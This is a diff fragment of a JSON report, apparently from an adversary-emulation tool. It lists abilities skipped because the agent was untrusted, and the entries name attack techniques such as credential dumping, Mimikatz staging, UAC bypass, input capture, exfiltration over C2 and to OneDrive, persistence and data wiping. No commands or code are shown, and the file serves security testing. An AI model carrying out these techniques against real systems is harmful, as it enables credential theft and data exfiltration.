+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "1b9e018d-986d-42d9-bb8b-0e104e98ce9c",
+          "ability_name": "Query Registry (2) (2)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "c4f4b13c-87b6-498c-b814-93570173068c",
+          "ability_name": "Credentials In Files (T1081) - Private Keys Extraction"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "a4b14c10-49aa-4ae4-b165-d5a37364fe62",
+          "ability_name": "Staging files for PowerShell module imports"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "a81ea4ad-bc9f-49a7-82d4-4466df641487",
+          "ability_name": "Screen Capturing"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "ee4c2eab-be57-434c-a32c-14b77360301a",
+          "ability_name": "Automated Collection (T1119) - Clipboard (T1115)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "db28f68d-e8b8-46e6-b680-642570d4b257",
+          "ability_name": "Automated Collection (T1119) - Input Capture (T1417)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "a612311d-a802-48da-bb7f-88a4b9dd7a24",
+          "ability_name": "Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "9b518cfb-125f-466e-872b-4f8171773ce5",
+          "ability_name": "Remote File Copy (T1105)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "6b90da47-13d0-48fc-8f07-0a1e6d5d876e",
+          "ability_name": "Scheduled Tasks (T1053)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "95564347-e77a-4a89-b08f-dcafa5468f2c",
+          "ability_name": "Remote System Discovery (T1018)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "c4a59e39-53b0-4ace-9528-8ff052752ece",
+          "ability_name": "Identifying current user on other machines"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "9fefcde6-083a-4440-8eca-dc03d30c0bcb",
+          "ability_name": "File and Directory Discovery (T1083)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "bddc0abc-07a0-41b7-813f-e0c64d9226b3",
+          "ability_name": "Copy Sandcat File"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "0b1841bd-ef8b-475c-bce7-8fcb2860984a",
+          "ability_name": "Screen Capture (T1113)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "d5170a60-3bdc-44e0-9870-a38db5c0cf81",
+          "ability_name": "File and Directory Discovery (T1083) (2)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "08e57385-dbce-4850-8bb7-589ef79465ab",
+          "ability_name": "Automated document collection (T1119)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "2d18c8ec-4593-49dc-9bf4-11d0673d6ae6",
+          "ability_name": "Data from staged file (T1074) and Exfiltration over C2 Channel (T1041) (2)"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "208b021b-c79a-4176-8ad1-3af99ed50c6f",
+          "ability_name": "Artifact Cleanup - Delete Staged Files"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92",
+          "ability_name": "Artifact Cleanup"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "00446217-53ca-4749-bacd-f41fe189d36e",
+          "ability_name": "Startup Folder Persistence Execution"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "e506f811-884d-4992-aacb-514b33a0324f",
+          "ability_name": "Click .LNK payload"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "4a2ad84e-a93a-4b2e-b1f0-c354d6a41278",
+          "ability_name": "Timestomp kxwn.lock"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "f9c0b150-822f-497b-ad6d-187f24561e9a",
+          "ability_name": "Detect Anti-Virus"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "2b5a72b1-01e4-48ae-98b0-2570a7894371",
+          "ability_name": "Detect Software"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "0cfadbcb-ec21-44ae-adb7-9a23176dd620",
+          "ability_name": "Enumerate Computer Name"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "96140694-6d13-40b6-9553-0e63533469f3",
+          "ability_name": "Enumerate Domain Name"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "f320eebd-e75b-4194-b529-79e64ad0b9ee",
+          "ability_name": "Enumerate Username"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "a34ab8f2-a106-41fb-af0b-cf5382bd18ae",
+          "ability_name": "Enumerate Processes"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "5226e5dc-fc28-43b7-a679-0db49d520402",
+          "ability_name": "UAC Bypass via sdctl"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "4ef6009d-2d62-4bb4-8de9-0458df2e9567",
+          "ability_name": "Credential Dumping"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24",
+          "ability_name": "Stage Mimikatz Binary"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "43aad2d6-d16a-4adb-aa2b-9510a3be4c52",
+          "ability_name": "WMI Persistence technique"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "1c8552c7-f7ed-4523-b640-72d65af5f855",
+          "ability_name": "Enumerate Domain Controller"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "a42be479-fc26-4d7c-9e63-7a9b74e4c8d2",
+          "ability_name": "Enumerate Domain SID"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "acecc8f7-18c2-41fd-87bc-39ffd644e4e9",
+          "ability_name": "Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c",
+          "ability_name": "Collect E-mails"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "fc231955-774f-442c-ac0e-e74dfda50c5c",
+          "ability_name": "Collect Files & Compress Collection"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "4840d6dd-da13-401a-be46-05db56f4e1e0",
+          "ability_name": "Exfiltrate data to OneDrive"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "f820b93d-6176-4a72-a138-a70b0b549c49",
+          "ability_name": "Data Wiping of staged files"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "267bad86-3f06-49f1-9a3e-6522f2a61e7a",
+          "ability_name": "Execute Invoke-Mimikatz"
+        },
+        {
+          "reason": "Agent untrusted",
+          "reason_id": 5,
+          "ability_id": "afb8d8f7-d059-4825-95ae-c5727e2db320",
+          "ability_name": "Triggering Persistent"
+        }
+      ]
+    }
+  ]
+}
